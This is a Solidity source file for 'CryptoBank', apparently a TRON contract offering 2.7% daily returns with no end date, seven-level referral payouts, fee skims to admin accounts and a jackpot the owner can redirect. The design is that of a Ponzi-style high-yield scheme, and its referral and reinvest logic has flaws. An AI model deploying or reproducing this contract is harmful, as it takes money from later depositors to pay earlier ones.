//SourceUnit: CryptoBank.sol

pragma solidity ^0.5.4;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 initial;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 level4RefCount;
        uint256 level5RefCount;
        uint256 level6RefCount;
        uint256 level7RefCount;
    }

}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

interface IJackpot {

    function distribute(address payable to,uint256 amount) external  returns (uint256);
}

contract CryptoBank is Ownable {
    using SafeMath for uint256;

    uint256 public constant DEVELOPER_RATE = 10; //per thousand
    uint256 public constant MARKETING_RATE = 35;
    uint256 public constant JACKPOT_RATE = 20;
    uint256 public constant ADMIN_RATE = 10;

    uint256 public constant REFERENCE_RATE = 100;
    uint256 public constant REFERENCE_LEVEL1_RATE = 30;
    uint256 public constant REFERENCE_LEVEL2_RATE = 20;
    uint256 public constant REFERENCE_LEVEL3_RATE = 10;
    uint256 public constant REFERENCE_LEVEL4_RATE = 10;
    uint256 public constant REFERENCE_LEVEL5_RATE = 10;
    uint256 public constant REFERENCE_LEVEL6_RATE = 10;
    uint256 public constant REFERENCE_LEVEL7_RATE = 10;
    
    uint256 public constant ACTIVATION_TIME = 1609092000;

    uint256 public constant MINIMUM = 50000000; //minimum investment needed
    uint256 public constant REFERRER_CODE = 6666; //default

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private adminAccount_;
    address payable private referenceAccount_;

    address  payable public jackpotContract_ ;
    uint256 jackpotStep = 50*10**6;
    uint256 jackpotCycle = 30 minutes;
    uint256 currentJackpotRound = 0;
    uint256 currentJackpotIndex = 6;
    uint256 jackpotPrize = 0;
    uint256 jackpotLastEntry = 0;

    mapping(uint256 => mapping(uint256 => address payable)) jackpotWinners;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;

    Objects.Plan[] private investmentPlans_;

    event onInvest(address investor, uint256 amount);
    event onGrant(address grantor, address beneficiary, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = address(0x41139d13c9ef71114e989009d95dbd639d837c3f78);
        adminAccount_ = address(0x41778bfe43736e9e8092291a48e3b47d3bf6e279bf);
        referenceAccount_ = msg.sender;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 0); //default to buy plan 0, no referrer
        }
    }

    function checkIn() public {
    }

    function setJackpotContract(address payable _contract) public  onlyOwner returns (bool){
        jackpotContract_ = _contract; 
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(27, 0));

    }

    function getJackpotData() public view returns (uint256 , uint256 , uint256  ,address[] memory){
        address[] memory leaderboard = new address[](5);

        for(uint256 i = 1 ; i < 6 ; i++){
          leaderboard[i-1] = jackpotWinners[currentJackpotRound][currentJackpotIndex - i];
        }

        return (jackpotPrize,jackpotLastEntry,(50*10**6)*((jackpotPrize/(10000*10**6)) + 1),leaderboard);
    }

    

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        terms
        );
    }

    function getTotalInvestments() public  view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }


    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256,uint256,uint256, uint256,uint256, uint256[] memory, uint256[] memory,uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory refStats = new uint256[](2);

        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.level4RefCount,
        investor.level5RefCount,
        investor.level6RefCount,
        investor.level7RefCount,
        currentDividends,
        newDividends,
        refStats
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory , uint256[] memory ) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory initials = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            initials[i] = investor.plans[i].initial;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        isExpireds,
         initials
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;

            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].level4RefCount = uid2Investor[_ref4].level4RefCount.add(1);
            }
            if (_ref5 >= REFERRER_CODE) {
                uid2Investor[_ref5].level5RefCount = uid2Investor[_ref5].level5RefCount.add(1);
            }
            if (_ref6 >= REFERRER_CODE) {
                uid2Investor[_ref6].level6RefCount = uid2Investor[_ref6].level6RefCount.add(1);
            }
            if (_ref7 >= REFERRER_CODE) {
                uid2Investor[_ref7].level7RefCount = uid2Investor[_ref7].level7RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }

    function reinvest() public  {
       uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;

        Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[0].planId];

        uint256 withdrawalDate = block.timestamp;

        uint256 amount = _calculateDividends(uid2Investor[uid].plans[0].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[0].lastWithdrawalDate);

        withdrawalAmount += amount;
        
        uid2Investor[uid].plans[0].lastWithdrawalDate = withdrawalDate;

      
        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }
        
        _reinvest(msg.sender,withdrawalAmount);
    }

   function _reinvest(address _addr, uint256 _amount) private returns (bool) {
        require(_amount >= 0, "_amount should be > 0");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
           return true;
        } 

        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[0].investment += _amount;

        totalInvestments_ = totalInvestments_.add(_amount);

        return true;
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(ACTIVATION_TIME < now , "NOT_YET_LAUNCHED");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode); 
            uint256 planCount = uid2Investor[uid].planCount;
            Objects.Investor storage investor = uid2Investor[uid];
            investor.plans[planCount].planId = _planId;
            investor.plans[planCount].investmentDate = block.timestamp;
            investor.plans[planCount].lastWithdrawalDate = block.timestamp;
            investor.plans[planCount].investment = _amount;
            investor.plans[planCount].initial = _amount;
            investor.plans[planCount].currentDividends = 0;
            investor.plans[planCount].isExpired = false;

            investor.planCount = investor.planCount.add(1);
             _calculateReferrerReward(_amount, investor.referrer);    
        }
        
        else if(uid == 6666 && uid2Investor[uid].planCount == 0){
            uint256 planCount = uid2Investor[uid].planCount;
            Objects.Investor storage investor = uid2Investor[uid];
            investor.plans[planCount].planId = _planId;
            investor.plans[planCount].investmentDate = block.timestamp;
            investor.plans[planCount].lastWithdrawalDate = block.timestamp;
            investor.plans[planCount].investment = _amount;
            investor.plans[planCount].initial = _amount;
            investor.plans[planCount].currentDividends = 0;
            investor.plans[planCount].isExpired = false;

            investor.planCount = investor.planCount.add(1);
             _calculateReferrerReward(_amount, investor.referrer);
        } else {//old user
            withdraw();
            Objects.Investor storage investor = uid2Investor[uid];
            
            investor.plans[0].investment += _amount;
            investor.plans[0].initial += _amount;
             _calculateReferrerReward(_amount, investor.referrer);
        }
       
        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        uint256 adminPercentage = (_amount.mul(ADMIN_RATE)).div(1000);
        adminAccount_.transfer(adminPercentage);
        
       

        if(jackpotLastEntry == 0) jackpotLastEntry = block.timestamp;

        if(block.timestamp - jackpotLastEntry > jackpotCycle){//roundend
            uint256 prize = jackpotPrize/5;
     
            for(uint256 i = 1 ; i < 6 ; i++){
                if(jackpotWinners[currentJackpotRound][currentJackpotIndex - i] != address(0)){
                    IJackpot(jackpotContract_).distribute(jackpotWinners[currentJackpotRound][currentJackpotIndex - i],prize);
                    jackpotPrize -= prize;
                }
            }

            jackpotLastEntry = 0;
            currentJackpotRound++;
            currentJackpotIndex = 6;
        }

        uint256 jackpotPercentage = (_amount.mul(JACKPOT_RATE)).div(1000);
        jackpotPrize += jackpotPercentage;
        jackpotContract_.transfer(jackpotPercentage);

        if(_amount >= jackpotStep){

            jackpotWinners[currentJackpotRound][currentJackpotIndex] = msg.sender;
            currentJackpotIndex++;
            jackpotLastEntry = block.timestamp;
            
            jackpotStep = (50*10**6)*((jackpotPrize/(10000*10**6)) + 1);
        }
        return true;
    }


    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function withdraw() public {
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;

        Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[0].planId];

        uint256 withdrawalDate = block.timestamp;

        uint256 amount = _calculateDividends(uid2Investor[uid].plans[0].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[0].lastWithdrawalDate);

        withdrawalAmount += amount;
        
        uid2Investor[uid].plans[0].lastWithdrawalDate = withdrawalDate;
        uid2Investor[uid].plans[0].currentDividends += (amount.mul(70)).div(100);

      
        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }
        
       
        //reinvest 
        uint256 reinvest_amount = (withdrawalAmount.mul(30)).div(100);
        withdrawalAmount -= reinvest_amount;
        _reinvest(msg.sender,reinvest_amount);

         //fees apply
        uint256 developerPercentage = (withdrawalAmount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (withdrawalAmount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        uint256 adminPercentage = (withdrawalAmount.mul(ADMIN_RATE)).div(1000);
        adminAccount_.transfer(adminPercentage);

        uint256 final_amount = withdrawalAmount;
        //withdraw
        msg.sender.transfer(final_amount);

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    
    function _calculateReferrerReward( uint256 _investment, uint256 _referrerCode) private {
    
        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;

            uint256 _refAmount = 0;

            if (_ref1 != 0 && (uid2Investor[_ref1].plans[0].investment >= 50*10**6  || _ref1 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
               
            }

            if (_ref2 != 0 && (uid2Investor[_ref1].plans[0].investment >= 5000*10**6 || _ref2 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
              
            }

            if (_ref3 != 0 && (uid2Investor[_ref3].plans[0].investment >= 25000*10**6 || _ref3 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
             
            }

            if (_ref4 != 0 && (uid2Investor[_ref4].plans[0].investment >= 50000*10**6 || _ref4 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref4].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref4].availableReferrerEarnings);
            }

            if (_ref5 != 0 && (uid2Investor[_ref5].plans[0].investment >= 150000*10**6 || _ref5 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL5_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref5].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref5].availableReferrerEarnings);
            }

            if (_ref6 != 0 && (uid2Investor[_ref6].plans[0].investment >= 300000*10**6 || _ref6 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL6_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref6].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref6].availableReferrerEarnings);
            }

            if (_ref7 != 0 && (uid2Investor[_ref7].plans[0].investment >= 500000*10**6 || _ref7 == 6666)) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL7_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref7].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref7].availableReferrerEarnings);
            }
        }

        if (_allReferrerAmount > 0) {
            referenceAccount_.transfer(_allReferrerAmount);
        }
    }

}